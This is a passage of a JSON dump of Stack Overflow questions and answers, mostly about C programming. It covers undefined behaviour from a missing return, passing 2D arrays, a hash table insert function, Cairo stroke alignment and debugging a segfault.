"dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 3, "last_activity_date": 1545843089, "last_edit_date": 1545843089, "creation_date": 1545842013, "answer_id": 53934630, "question_id": 53934585, "link": "https://stackoverflow.com/questions/53934585/why-does-my-user-defined-function-work-without-a-return-statement/53934630#53934630", "title": "Why does my user-defined function work without a return statement?", "body": "<p>Failing to return a value from a function with a non- <code>void</code> return type invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.  </p>\n\n<p>One of the ways undefined behavior can manifest itself is that the program appears to work properly.  A seemingly unrelated change can however change how undefined behavior will manifest.  In this case you never attempt to use the return value so that's probably why you don't see any strange behavior.</p>\n\n<p>So just because a program could crash or output strange things doesn't mean it will.  </p>\n\n<p>The proper thing to do in this particular case is to change the function's return type to <code>void</code>.</p>\n\n<p>EDIT:</p>\n\n<p>Even though you fail to return a value from the function, your program works normally because you don't attempt to use that return value.  If you did try to use the return value, <em>then</em> you invoke undefined behavior.  Still, you should either change the function to return <code>void</code> or return some meaningful value.</p>\n"}], "owner": {"reputation": 19, "user_id": 7840889, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-OOsw5QT1fAQ/AAAAAAAAAAI/AAAAAAAAA5U/lskLCtp4uv4/photo.jpg?sz=128", "display_name": "Dodoke", "link": "https://stackoverflow.com/users/7840889/dodoke"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "closed_date": 1545842260, "answer_count": 1, "score": 1, "last_activity_date": 1545843089, "creation_date": 1545841767, "question_id": 53934585, "link": "https://stackoverflow.com/questions/53934585/why-does-my-user-defined-function-work-without-a-return-statement", "closed_reason": "Duplicate", "title": "Why does my user-defined function work without a return statement?", "body": "<p>Learning C. Working with user-defind functions.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint print_random_matrix (int m, int n);\n\nvoid main (void)\n{\n    int m, n;\n\n    printf(\"m: \"); scanf(\"%d\", &amp;m);\n    printf(\"n: \");   scanf(\"%d\", &amp;n);\n\n    print_random_matrix(m, n);\n}\n\nint print_random_matrix (int m, int n)\n{\n    int i, j, a[20][20];\n    for (i= 1; i&lt;= m; i++)\n    {\n        for (j= 1; j&lt;= n; j++)\n        {\n             printf(\"%d \", rand()%10);\n        }\n        printf(\"\\n\");\n    }\n    //why does this work without RETURN?\n}\n</code></pre>\n\n<p>As far as I know you need a return statement to return the value from the function you defined, but it works without one and I don't understand why.\nThis code does not look right to me. </p>\n\n<p>Is the code correct?</p>\n\n<p>&amp;</p>\n\n<p>Why does it work right now?</p>\n\n<p>&amp;</p>\n\n<p> How do I write the print_random_matrix function with a return statement?(if I have to)</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "edited": false, "score": 1, "creation_date": 1545842037, "post_id": 53934484, "comment_id": 94709354, "body": "The type of <code>char board[N][N]</code>, is, unsurprisingly, <code>char[N][N]</code>. If you&#39;re asking about the type of a pointer <code>char[N][N]</code> decays to, then the answer is <code>char(*)[N]</code> (note that&#39;s it&#39;s the <i>left</i> <code>[N]</code> that&#39;s removed). You could pass it as <code>char x[N][N]</code> or <code>char (*x)[N]</code> (the first one is no different from and is automatically converted to the second one)."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "edited": false, "score": 1, "creation_date": 1545842134, "post_id": 53934484, "comment_id": 94709391, "body": "@HolyBlackCat: And the function definition and prototype could also use <code>char board[][N]</code> for the parameter."}], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 9111262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99b6fa1fe758703e69e614ccb99ef0ba?s=128&d=identicon&r=PG&f=1", "display_name": "Mathing", "link": "https://stackoverflow.com/users/9111262/mathing"}, "edited": false, "score": 1, "creation_date": 1545841366, "post_id": 53934505, "comment_id": 94709109, "body": "and if <code>N</code> is defined in the following way <code>#define N 10</code> ?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 41, "user_id": 9111262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99b6fa1fe758703e69e614ccb99ef0ba?s=128&d=identicon&r=PG&f=1", "display_name": "Mathing", "link": "https://stackoverflow.com/users/9111262/mathing"}, "edited": false, "score": 0, "creation_date": 1545841463, "post_id": 53934505, "comment_id": 94709143, "body": "In that case, since <code>N</code> is a macro representing a compile time constant, you can simply pass in the array specifying the size: <code>read_input(char board[N][N])</code>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 41, "user_id": 9111262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99b6fa1fe758703e69e614ccb99ef0ba?s=128&d=identicon&r=PG&f=1", "display_name": "Mathing", "link": "https://stackoverflow.com/users/9111262/mathing"}, "edited": false, "score": 0, "creation_date": 1545841489, "post_id": 53934505, "comment_id": 94709156, "body": "@Mathing: if the dimensions are constant, you don&#39;t have to use the <code>*</code> notation; that is for variable-length arrays."}, {"owner": {"reputation": 41, "user_id": 9111262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99b6fa1fe758703e69e614ccb99ef0ba?s=128&d=identicon&r=PG&f=1", "display_name": "Mathing", "link": "https://stackoverflow.com/users/9111262/mathing"}, "edited": false, "score": 0, "creation_date": 1545841542, "post_id": 53934505, "comment_id": 94709173, "body": "@dbush can you edit your answer in according to this case?"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1545841695, "post_id": 53934505, "comment_id": 94709230, "body": "<code>cha board[*][*]</code> will not compile,  the <code>char [*]</code> is an incomplete type,  you can&#39;t make an array of incomplete types."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 41, "user_id": 9111262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99b6fa1fe758703e69e614ccb99ef0ba?s=128&d=identicon&r=PG&f=1", "display_name": "Mathing", "link": "https://stackoverflow.com/users/9111262/mathing"}, "edited": false, "score": 0, "creation_date": 1545841745, "post_id": 53934505, "comment_id": 94709247, "body": "@Mathing Updated to reflect the updated requirement."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 1, "creation_date": 1545841824, "post_id": 53934505, "comment_id": 94709271, "body": "@KamilCuk <code>void read_input(int, char board[*][*]);</code> does in fact compile.  As a function declaration, it means that the dimensions of the array are defined by parameters specified earlier."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1545841861, "post_id": 53934505, "comment_id": 94709284, "body": "@KamilCuk, <code>char board[*][*]</code> is fine (for a function parameter), provided that the implementation supports VLAs and is conforming."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 1, "creation_date": 1545841896, "post_id": 53934505, "comment_id": 94709295, "body": "@KamilCuk: You can use the <code>char array[*][*]</code> notation in function declarations to indicate that the dimensions are determined at runtime.  I don&#39;t think you can use it in the function definition, though.  See C11 <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.6.3\" rel=\"nofollow noreferrer\">&#167;6.7.6.3 Function declarators (including prototypes)</a>, especially <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.6.3p12%5D\" rel=\"nofollow noreferrer\">&#182;12</a>."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": -1, "last_activity_date": 1545841695, "last_edit_date": 1545841695, "creation_date": 1545841238, "answer_id": 53934505, "question_id": 53934484, "link": "https://stackoverflow.com/questions/53934484/what-is-the-type-of-char-boardnn/53934505#53934505", "title": "What is the type of &quot;char board[N][N]&quot;?", "body": "<p>Since the array size is a compile time constant, you can denote the array with that size when it is passed to your function.</p>\n\n<pre><code>void read_input(char board[N][N])\n{\n   ...\n}\n\n\nread_input(board);\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 9111262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99b6fa1fe758703e69e614ccb99ef0ba?s=128&d=identicon&r=PG&f=1", "display_name": "Mathing", "link": "https://stackoverflow.com/users/9111262/mathing"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 183, "favorite_count": 0, "closed_date": 1545841643, "answer_count": 1, "score": 1, "last_activity_date": 1545841695, "creation_date": 1545841108, "last_edit_date": 1545841595, "question_id": 53934484, "link": "https://stackoverflow.com/questions/53934484/what-is-the-type-of-char-boardnn", "closed_reason": "Duplicate", "title": "What is the type of &quot;char board[N][N]&quot;?", "body": "<p>If i will declare array in the following way: </p>\n\n<pre><code>#define N 10\n\nchar board[N][N]\n</code></pre>\n\n<p>And I want to write function <code>void read_input(...)</code> that will get the array <code>board</code>, what I need to write instead <code>...</code> ?  </p>\n\n<p>I don't sure what it's need to be (maybey <code>char**</code> or <code>char[N][N]</code>? or else something?)</p>\n"}, {"tags": ["c", "hashtable"], "comments": [{"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545843694, "post_id": 53934282, "comment_id": 94709898, "body": "Please have a look at <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Your code at least is not complete. Most important part lacking: How do you initialise your hash table! (Declaration of Pair/Bucket: Well, one can imagine...). Proper formatting would make the code much more readable."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545843715, "post_id": 53934282, "comment_id": 94709907, "body": "To me your question is unclear. Maybe it will help if you show us how you initialize the hash table and how you call the insert function. Your current code doesn&#39;t seem to insert anything at all"}], "answers": [{"tags": [], "owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "is_accepted": false, "score": 0, "last_activity_date": 1545845516, "last_edit_date": 1545845516, "creation_date": 1545845206, "answer_id": 53935151, "question_id": 53934282, "link": "https://stackoverflow.com/questions/53934282/hashtable-insert-implementation-using-string-key-problem/53935151#53935151", "title": "Hashtable insert implementation using string key problem", "body": "<p>There are quite a few problems in your insertion function:</p>\n\n<pre><code>void hash_insert (HashTable *tab, const char *key, int value)\n{\n    unsigned long h = hash(key) % tab-&gt;hash_size;\n    int i = 0;\n\n    // depending on how you initialise your hash table, the list might yet\n    // be NULL(!) - so you possibly yet need a check for!\n\n    // you need FIRST to check if the index is yet valid, THEN check\n    // if there is a key!\n    //while(tab-&gt;bucket[h]-&gt;list[i]-&gt;key != NULL &amp;&amp; (i &lt; tab-&gt;bucket-&gt;size))\n    while(i &lt; tab-&gt;bucket[h].size &amp;&amp; tab-&gt;bucket[h].list[i].key != NULL)\n    // additionally: you have a pointer, index operator [] dereferences\n    // -&gt; you have a struct directly -&gt; need to access via .\n    {\n        //Pair pair = copy_key(key,value);\n        // BAD idea: you malloc a struct, but never free it -&gt; memory leak!\n\n        if (tab-&gt;bucket[h].list[i].key == /*pair-&gt;*/key)\n        // compare directly!\n\n        // however: == compares the pointers only - most likely, though,\n        // you have created a new string somewhere else just with same\n        // CONTENT - in this case you need to compare via strcmp:\n        if (strcmp(tab-&gt;bucket[h].list[i].key, key) == 0)\n\n        {\n            //tab-&gt;bucket[h]-&gt;list[i]-&gt;value == pair-&gt;value;\n            // comparison? assuming you wanted to assign:\n            tab-&gt;bucket[h].list[i].value = value;\n\n            return;\n        }\n    }\n\n    // end of while reached, the key was not yet found!\n    // -&gt; you need to insert it here:\n\n    if(i == tab-&gt;bucket[h].size)\n    {\n        // no space in buckets left!\n        // -&gt; need to realloc (leaving this to you)\n\n        // BUT: you might want to consider overall fill grade or maximum fill\n        // grade for buckets and do a complete re-hash of all contents...\n    }\n\n    // assuming we insert in THIS bucket:\n    tab-&gt;bucket[h].list[i].key = ???;\n    tab-&gt;bucket[h].list[i].value = value;\n}\n</code></pre>\n\n<p><code>???</code> - well, depends. I pretty much assume you want the hash map to own the key strings it contains. Then you are safe from key being a local array going out of scope or a dynamically allocated string being deleted afterwards! So:</p>\n\n<pre><code>tab-&gt;bucket[h].list[i].key = strdup(key);\n</code></pre>\n\n<p>If you want to avoid unnecessary copies because you allocated the string already, you might add another parameter: <code>int isTakeOwnwership</code> (or <code>bool</code>, but you need to <code>#include &lt;stdbool.h&gt;</code> for):</p>\n\n<pre><code>tab-&gt;bucket[h].list[i].key = isTakeOwnership ? key : strdup(key);\n</code></pre>\n\n<p>In both examples, I did not check for result of strdup being NULL - you need to do so and handle the case that memory allocation failed (maybe add a return value to your insertion function indicating success or failure?).</p>\n\n<p>Do not forget to <code>free</code> the strings in the map on element removal!!! Remember, your map took ownership of.</p>\n"}], "owner": {"reputation": 1, "user_id": 10711072, "user_type": "registered", "profile_image": "https://graph.facebook.com/10156718044758632/picture?type=large", "display_name": "Hans Peter Eriksson", "link": "https://stackoverflow.com/users/10711072/hans-peter-eriksson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 162, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545845516, "creation_date": 1545840019, "last_edit_date": 1545843920, "question_id": 53934282, "link": "https://stackoverflow.com/questions/53934282/hashtable-insert-implementation-using-string-key-problem", "title": "Hashtable insert implementation using string key problem", "body": "<p>I have a problem I've been trying to solve for days now. I try to create a Hashtable from three structs the first one with buckets of pointers to a pair array with key and value pair. The key is supposed to be a string (char * arr). I don't fully grasp how to create a working insert function for it what I aim to do in my code is trying to see if in bucket h there exists a key or not. I feel something is wrong with my logic and syntax. If someone could help me on the way it would be mighty appreciated.</p>\n\n<p>I have looked at hashtable theory on Wikipedia and youtube videos but no one of them uses three structs and string keys. that's where I get stuck I feel.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include\"hashtable.h\"\n\nstruct hash_table\n{\n    Bucket *bucket;\n    int hash_size;\n};\n\nstruct bucket\n{\n    Pair *list;\n    int capacity;\n    int size;\n};\n\nstruct pair\n{\n    char *key;\n    int value;\n};\n\nPair copy_key(char *key, int value)\n{\n    Pair copy = malloc(sizeof(Pair));\n    copy-&gt;key = key;\n    copy-&gt;value = value;\n    return copy;\n}\n\nunsigned long hash(unsigned char *str)\n{\n    unsigned long hash = 5381;\n    int c;\n\n    while (c = *str++)          \n        hash = ((hash &lt;&lt; 5) + hash) + c; /* hash * 33 + c */\n\n    return hash;\n}\n\nvoid hash_insert (HashTable *tab, const char *key, int value)\n{\n    unsigned long h = hash(key) % tab-&gt;hash_size;\n    int i = 0;\n\n    while(tab-&gt;bucket[h]-&gt;list[i]-&gt;key != NULL &amp;&amp; (i &lt; tab-&gt;bucket-&gt;size))\n    {\n        Pair pair = copy_key(key,value);\n        if (tab-&gt;bucket[h]-&gt;list[i]-&gt;key == pair-&gt;key)\n        {\n            tab-&gt;bucket[h]-&gt;list[i]-&gt;value == pair-&gt;value;\n            return;\n        }\n    }\n}\n</code></pre>\n\n<p>A working insert function for a three struct layer hashtable with string keys.</p>\n"}, {"tags": ["c", "ruby", "gtk3", "cairo"], "answers": [{"tags": [], "owner": {"reputation": 7642, "user_id": 436275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a72a51d31e40d541a9786e0243678029?s=128&d=identicon&r=PG", "display_name": "Uli Schlachter", "link": "https://stackoverflow.com/users/436275/uli-schlachter"}, "is_accepted": true, "score": 1, "last_activity_date": 1545905181, "creation_date": 1545905181, "answer_id": 53943201, "question_id": 53934276, "link": "https://stackoverflow.com/questions/53934276/stroke-alignment-in-cairo/53943201#53943201", "title": "Stroke alignment in Cairo", "body": "<p>No, there is no such method built-in.</p>\n\n<p>One could likely approximate this with a temporary surface that is later used as a mask. For example, to do \"outside\", you first fill a temporary surface with \"transparent\", then stroke with twice your desired line width some \"opaque\", and finally fill the shape with \"transparent\" to get rid of the inner part of the line width. The resulting surface can then be used as a mask.</p>\n\n<p>\"Inside\" would be similar, but with an extra trick: Again, transparent surface and stroke with twice the line width. Now the outside part of this stroke needs to be removed. For this, one needs a path with a winding rule of even-odd. Add a surface-sized rectangle to this path inverts the path, thus allowing to remove everything outside via a fill.\nFor a non-zero winding rule... I do not have any immediate ideas (well, another temporary surface that is then inverted via a full-surface-paint with operator SUBTRACT?).</p>\n"}], "owner": {"reputation": 9435, "user_id": 2626000, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/j8GY0.jpg?s=128&g=1", "display_name": "Aaron Christiansen", "link": "https://stackoverflow.com/users/2626000/aaron-christiansen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 279, "favorite_count": 0, "accepted_answer_id": 53943201, "answer_count": 1, "score": 1, "last_activity_date": 1545905181, "creation_date": 1545839992, "last_edit_date": 1545840397, "question_id": 53934276, "link": "https://stackoverflow.com/questions/53934276/stroke-alignment-in-cairo", "title": "Stroke alignment in Cairo", "body": "<p>Many graphics packages allow the user to select where they would like to draw the border of a region around a shape; either along the inside, outside or centre of the shape. For example, this shows the same square with the border drawn along the centre, inside and outside respectively:</p>\n\n<p><a href=\"https://i.stack.imgur.com/u0hNL.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/u0hNL.png\" alt=\"enter image description here\"></a></p>\n\n<p>I could scale the path up/down based on the stroke's width, but I wanted to check if there was built-in support for this first.</p>\n\n<p>I'm using Ruby, but if there's a C method for this, it's likely available in the Ruby bindings as well.</p>\n\n<p>Is there a method to draw a stroke around the outside or inside of a path, rather than along the centre, in Cairo?</p>\n"}, {"tags": ["c", "function"], "comments": [{"owner": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 1, "creation_date": 1545838422, "post_id": 53933985, "comment_id": 94708176, "body": "You could either pass the numbers in an array, change the values in side the array ... If that&#39;s still too pointerish, you could pass and return a struct (by value)."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1545838452, "post_id": 53933985, "comment_id": 94708187, "body": "Show a minimal complete example."}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1545838496, "post_id": 53933985, "comment_id": 94708199, "body": "A not recommend way of &quot;solving&quot; this problem would be to use global variables. But that&#39;s a bad practice in most cases"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545838582, "post_id": 53933985, "comment_id": 94708225, "body": "Do the function <i>have</i> to be <code>void</code>? Can it be modified to return something?"}], "answers": [{"tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": false, "score": 1, "last_activity_date": 1545838741, "creation_date": 1545838741, "answer_id": 53934076, "question_id": 53933985, "link": "https://stackoverflow.com/questions/53933985/updating-a-value-in-main-after-updating-it-in-a-function-without-pointers/53934076#53934076", "title": "updating a value in main after updating it in a function , without pointers", "body": "<p>C offers three general ways of communicating values back to the calling function:</p>\n\n<ol>\n<li><strong>Returning a value</strong> - This is the most common way of providing data back for primitive types. However, you are allowed to make a <code>struct</code> type, and return it to the caller.</li>\n<li><strong>Passing a pointer</strong> - This is common for situations when multiple variables need to be modified.</li>\n<li><strong>Using variables visible to both the caller function and the function being called</strong> - these could be static or global variables.</li>\n</ol>\n\n<p>Note that it is not enough to keep a position for the head and the tail of the snake: you need to store all positions occupied by your snake in order to be able to advance its tail to the next step. This could be easily implemented with a <a href=\"https://en.wikipedia.org/wiki/Circular_buffer\" rel=\"nofollow noreferrer\"><em>Circular Buffer</em></a> sized at the maximum length of the snake:</p>\n\n<pre><code>static int snake_row[MAX_LENGTH+1];\nstatic int snake_col[MAX_LENGTH+1];\nstatic int snake_head = 0;\nstatic int snake_tail = 0;\n</code></pre>\n\n<p>Arrays <code>snake_row</code> and <code>snake_col</code> between indexes <code>snake_head</code> and <code>snake_tail</code> represent positions currently occupied by the snake. This makes <code>board[][]</code> optional, because you can check for self-crossing by iterating the buffer.</p>\n"}], "owner": {"reputation": 37, "user_id": 7548349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b8da10574ff52266581ce8107c979ed?s=128&d=identicon&r=PG&f=1", "display_name": "salam", "link": "https://stackoverflow.com/users/7548349/salam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1545838741, "creation_date": 1545838183, "question_id": 53933985, "link": "https://stackoverflow.com/questions/53933985/updating-a-value-in-main-after-updating-it-in-a-function-without-pointers", "title": "updating a value in main after updating it in a function , without pointers", "body": "<p>im trying to update values in main according to what changes were made in a function without using pointers</p>\n\n<p>im working on a snake game and to make a move i send the row and column of both the head and the tail to a void function , and inside of it i change them according to what move was made , but they are not updated in main and therefor the next move wont be donr correctly , how can i update them in main but without using pointers ?(its a homework , they specified not using pointers)\nthe code below is for one case which is when the player wants to move down (2 is foe down) and at the end i changed the column of the tail and the row of the head, but it dosent update them in main for when i send the next move</p>\n\n<pre><code>if(move==2){\n   if (board[head_row+1][head_cal] != 0) \n            {print_finsih_msg(player,ILLEGAL_MOVE);exit(0);}\n   if(head_row == tail_row &amp;&amp; head_cal &lt; tail_cal) {               \n            board[head_row+1][head_cal] = SHTRODEL_HEAD ; \n            board[head_row][head_cal] = '+' ;\n            board[tail_row][tail_cal] = 0;\n            tail_cal--;\n            head_row++;}\n</code></pre>\n\n<p>so for examble if the next move is 6 - right it will print that the move is illegal because it still has that the head has its body on the right </p>\n"}, {"tags": ["c", "string", "pointers", "stack"], "comments": [{"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1545836574, "post_id": 53933714, "comment_id": 94707603, "body": "<a href=\"https://www.hackerrank.com/challenges/simple-text-editor/problem\" rel=\"nofollow noreferrer\">hackerrank.com/challenges/simple-text-editor/problem</a> is the link to the detailed question and code"}], "answers": [{"comments": [{"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "edited": false, "score": 0, "creation_date": 1545841194, "post_id": 53933745, "comment_id": 94709050, "body": "but now im getting another error.       Process 35026 stopped * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x0)     frame #0: 0x0000000100000c57 a.out`peek(sptr=0x0000000100100320) at undo.c:19    16  \t    17  \tchar* peek(STACK* sptr)    18  \t{ -&gt; 19  \t    return sptr -&gt; stk[sptr -&gt; top];     20  \t}    21  \t    22  \tvoid push(char* w, STACK* sptr) Target 0: (a.out) stopped. (lldb)"}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 0, "last_activity_date": 1545836770, "creation_date": 1545836770, "answer_id": 53933745, "question_id": 53933714, "link": "https://stackoverflow.com/questions/53933714/operations-on-stack-of-array-of-characters/53933745#53933745", "title": "operations on STACK of array of characters", "body": "<p>The problem is, in your code</p>\n\n<pre><code> scanf(\"%s\", s);\n</code></pre>\n\n<p><code>s</code> does not point to any valid memory. It is a local variable (pointer) with auto storage duration and not initialized explicitly, thus is holds an indeterminate value, which is an invalid address in context of your program.</p>\n\n<p>Attempt to access that invalid memory invoke <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>You need to either</p>\n\n<ul>\n<li>make <code>s</code> point to a valid memory (you can use allocator functions like <code>malloc()</code> and family)</li>\n<li>make <code>s</code> an array with predefined length, and length limit your input (much preferable, IMHO).</li>\n</ul>\n"}], "owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545841402, "creation_date": 1545836544, "last_edit_date": 1545841402, "question_id": 53933714, "link": "https://stackoverflow.com/questions/53933714/operations-on-stack-of-array-of-characters", "title": "operations on STACK of array of characters", "body": "<blockquote>\n  <p>i am getting a runtime error for the following program which is pretty self explanatory (see main() first)</p>\n  \n  <p>GDB trace:\n  Reading symbols from solution...done. [New LWP 17326] Core was\n  generated by `solution'. Program terminated with signal SIGSEGV,\n  Segmentation fault.</p>\n  \n  <h1>0  __strcat_sse2_unaligned ()</h1>\n\n<pre><code>at 